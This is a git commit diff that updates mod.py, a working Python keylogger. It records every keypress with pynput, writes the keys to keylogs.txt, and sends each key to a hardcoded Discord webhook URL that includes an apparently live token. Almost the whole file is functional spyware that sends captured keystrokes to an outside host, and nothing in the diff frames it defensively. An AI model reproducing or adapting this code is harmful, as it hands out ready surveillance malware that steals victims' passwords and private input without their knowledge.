e80cec5d0c7009bb09b86805bb1b6d76bcc3b44d
VISHNU PREMIL <82073583+strangedreamer4@users.noreply.github.com>
2023-12-20 17:02:18 +0530

    Update mod.py

--- mod.py
+++ mod.py
@@ -1,30 +1,30 @@
+#import some stuff
+
 from pynput.keyboard import Key, Listener
-from dhooks import Webhook
+from dhooks import Webhook #pip install dhooks
 import logging
-import threading
 
 log_dir = ""
 
-# Replace 'WEBHOOK_URL' with your actual Discord webhook URL
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1186985510242107413/WBRGMxPdJshFgeiB_J7gOOSQAIaUzghY56qA423ztlf1vulXCsj1-16kzWCbC2JsEVJs'
+# URL HERE
+log_send = Webhook('https://discord.com/api/webhooks/1186985510242107413/WBRGMxPdJshFgeiB_J7gOOSQAIaUzghY56qA423ztlf1vulXCsj1-16kzWCbC2JsEVJs')
 
-log_send = Webhook(WEBHOOK_URL)
+#save the file as keylogs.txt
 
-logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
+	level=logging.DEBUG, format='%(asctime)s: %(message)s')
+    #print("action 1")
+
+#log_send.send('DBG')
 
 def on_press(key):
     logging.info(str(key))
+
+    #print the key
     print(key)
+
+    #log the key
     log_send.send(str(key))
 
-# Start the listener in a separate thread with daemon=True
-listener_thread = threading.Thread(target=Listener(on_press=on_press).join, daemon=True)
-listener_thread.start()
-
-# Keep the main thread running
-try:
-    # The main thread can perform other tasks or simply sleep
-    while True:
-        pass
-except KeyboardInterrupt:
-    print("Script terminated by user.")
+with Listener(on_press=on_press) as listener:
+    listener.join()
